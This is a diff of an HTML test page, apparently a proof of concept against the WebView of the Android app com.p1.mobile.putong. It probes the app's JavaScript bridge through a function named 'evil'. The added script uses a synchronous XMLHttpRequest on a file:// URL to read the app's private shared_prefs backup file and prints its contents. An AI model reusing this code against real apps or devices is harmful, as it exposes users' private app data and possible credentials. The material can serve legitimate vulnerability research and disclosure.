@@ -17,11 +17,45 @@ function evil(){
 	document.getElementById("content").innerText = 'call canIUse : '+window.tantan.canIUse('cc') + ' , and : ' + window.tantan.triggerAction('c','d');
 }
 
-setInterval(gotowhite,5);//5毫秒
-setTimeout(evil,3000);//倒计时3秒
+//setInterval(gotowhite,5);//5毫秒
+//setTimeout(evil,3000);//倒计时3秒
 	
 
   
 </script>
+	
+	
+<script>
+function createXHR(){
+    if(typeof XMLHttpRequest != 'undefined'){
+        return new XMLHttpRequest();
+    }else if(typeof ActiveXObject != 'undefined'){
+        if(typeof arguments.callee.activeXString != 'string'){
+            var versions = ['MSXML2.XMLHttp.6.0','MSXML2.XMLHttp.3.0','MSXML2.XMLHttp'];
+            for(var i=0;i<versions.length;i++){
+                try{
+                    var xhr = new ActiveXObject(versions[i]);
+                    arguments.callee.activeXString = versions[i];
+                    return xhr;
+                }catch(ex){}
+            }
+        }
+        return new ActiveXObject(arguments.callee.activeXString);
+    }else{
+        throw new Error('No XHR Object available');
+    }
+}
+// send GET Request
+function sendGetRequest(url,callback){
+    var xhr  = createXHR();
+    xhr.open('GET',url,false);
+    xhr.send();
+    callback(xhr.responseText);
+}
+sendGetRequest('file:///data/data/com.p1.mobile.putong/shared_prefs/putongPref_backup.xml', function(response){
+    console.log(response);
+});
+</script>
+	
 </body>
 </html>
